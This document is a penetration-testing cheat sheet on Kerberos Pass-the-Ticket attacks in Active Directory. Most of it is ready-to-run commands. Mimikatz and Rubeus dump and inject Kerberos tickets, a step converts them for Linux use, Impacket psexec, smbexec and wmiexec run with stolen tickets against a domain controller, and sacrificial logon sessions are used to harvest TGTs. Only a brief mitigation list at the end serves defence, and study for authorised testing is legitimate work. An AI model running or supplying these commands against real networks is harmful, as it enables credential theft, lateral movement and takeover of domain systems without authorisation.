### Content

- [Overview](#overview)
- [From Windows](#from-windows)
	- [Using Mimikatz](#using-mimikatz)
	- [Using Rubeus](#using-rubeus)
- [From Linux](#from-linux)
- [Sacrificial Processes](#sacrificial-processes)
	- [Sacrificial Process Without Administrative Privileges](#sacrificial-process-without-administrative-privileges)
- [Mitigation](#mitigation)

---
### Overview

- In this attack, we use a stolen Kerberos ticket to move laterally without touching LSASS (Ex: `Sekurlsa::LogonPasswords`) because it will get sent to the DC. 
- A valid Kerberos ticket required to perform a Pass the Ticket can be:
	- `TGS` to allow access to a particular resource.
	- `TGT` to request STs to access any resource the user can access.
- **As a non-administrative user**, you can only get your tickets, but **as a local administrator**, you can collect everything.

> To create a PowerShell Remoting session on a remote computer, you must be an administrator, be a member of the `Remote Management Users` group, or have explicit `PowerShell Remoting` permissions in your session configuration.
> 
> PowerShell Remoting creates both HTTP/TCP/5985 and HTTPS/TCP/5986 listeners.

---
### From Windows
###### Using Mimikatz

``` Powershell
# Collect tickets

PS> mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"
########
# /export: will export the every ticket in the memory:
	# Computer account ticket: Ends with $ and needs a ticket to interact with AD
	# User ticket: [randomvalue]-username@service-domain.local.kirbi
		# If service = krbtgt then the ticket is the TGT of that account 
#########

# Inject a ticket into the current session. 
PS> mimikatz.exe "privilege::debug" "kerberos::ptt [0;1e4c7df]-2-0-40e10000-joed@krbtgt-DOMAIN.COM.kirbi exit"

# spawn CMD with the injected ticket
PS> mimikatz.exe "misc::cmd"

# To be used after injecting ticket with either Rubeus or Mimikatz
PS> Enter-PSSession -ComputerName DC01
# Or
PS> .\PsExec.exe -accepteula \\<IP> cmd
```

###### Using Rubeus

``` Powershell
# Collect tickets
PS> Rubeus.exe dump /nowrap

# Monitor for new tickets
PS> Rubeus.exe monitor /interval:5 /nowrap

# Inject ticket kirbi file
PS> Rubeus.exe ptt /ticket:<<.kirbi file> or <Base64Blob>>

# Convert .kirbi to Base64 blob, in case we extracted tickets by mimikatz
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[randomvalue]-username@service-domain.local.kirbi"))

# To be used after injecting ticket with either Rubeus or Mimikatz
PS> Enter-PSSession -ComputerName DC01
# Or
PS> .\PsExec.exe -accepteula \\<IP> cmd
```

---
### From Linux

Kerberos tickets extracted from Windows needs to be converted to `.Ccache` format for use within Linux.

```bash
# Convert the extracted rubeus blob to a ccache file.
$ python3 rubeustoccache.py <Base64Ticket> <Output.kirbi> <Output.ccache>

# Export the ticket to the Kerberos environmental variable:
$ export KRB5CCNAME=ticket.ccache

# Once exported we can use impacket with the -k and -no-pass parameter to execute commands on the target Domain Controller.
$ psexec.py corp.local/user@DC01.security.local -k -no-pass
$ smbexec.py corp.local/user@DC01.security.local -k -no-pass
$ wmiexec.py corp.local/user@DC01.security.local -k -no-pass
```

---
### Sacrificial Processes

A `sacrificial process` creates a new Logon Session and passes tickets to that session. (Administrative privileges to the machine are required in case of using Rubeus)

As failure to create a Sacrificial Process can result in taking a service down. This is because it is easy to overwrite an existing Logon Sessions Kerberos Ticket. If the local machine account (SYSTEM$) loses its Kerberos ticket, it will likely not get another one until a reboot. If a service loses its ticket, it won't get a new one until the service restarts or sometimes a machine reboot.

The Rubeus action `createnetonly` creates a sacrificial process, and the future commands will use the `/LUID:` to interact with it.

```PowerShell
# Create a new porcess with new logon session uid and display it to intercat with
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show


# On the new created cmd process
# list all tickets that user can read and extract from the different logon sessions:
.\Rubeus.exe triage

# Check the current session injected tickets usint the built-in command
 klist
 
# Extract the tickets that are related to a specific service and specific LUID
# service:krbtgt means that we are dumping the TGTs
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap

# Using Rubeus to renew the TGT we got
Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt
# Now that we have this TGT in memory, we can perform any action on behalf of the impersonated user 
```

###### Sacrificial Process Without Administrative Privileges

The reason why `Rubeus` needs administrative rights is to interact with the `NetOnly` process it spawns to create the Logon Session. When using a proper C2 Framework, the stdin/stdout of the process is generally mapped to `named pipes`. This enables the framework to interact with processes it spawns without administrative privileges.

---
### Mitigation

- Monitor events that create and kill processes
- Check any users requesting new TGTs or TGSs outside of normal operations (before tickets expire, not at a restart, etc.).
- Privileged identity management (minimize the number of admins and how those accounts are used).
- Monitor named and anonymous pipes used for direct interaction with the host using tools such as [Pipelist](https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist) from the Sysinternals suite or [Pipe Monitor](https://ioninja.com/plugins/pipe-monitor.html).

---
